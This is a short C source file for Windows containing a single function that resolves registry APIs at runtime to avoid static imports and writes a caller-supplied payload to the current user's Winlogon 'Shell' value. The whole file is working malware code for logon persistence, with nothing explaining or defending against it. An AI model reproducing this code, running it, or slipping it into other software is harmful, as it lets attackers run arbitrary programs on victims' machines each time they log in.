#include <windows.h>

void __attribute__((noinline)) __attribute__((used)) routine_v3(const char* payload){
    HMODULE hAdv = LoadLibraryA("advapi32.dll");
    typedef LSTATUS(APIENTRY* fROK)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    typedef LSTATUS(APIENTRY* fRSV)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    typedef LSTATUS(APIENTRY* fRCK)(HKEY);
    fROK _ROK = (fROK)GetProcAddress(hAdv, "RegOpenKeyExA");
    fRSV _RSV = (fRSV)GetProcAddress(hAdv, "RegSetValueExA");
    fRCK _RCK = (fRCK)GetProcAddress(hAdv, "RegCloseKey");
    HKEY hKey;
    if (_ROK(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey) == 0) {
        _RSV(hKey, "Shell", 0, REG_SZ, (const BYTE*)payload, lstrlenA(payload));
        _RCK(hKey);
    }
}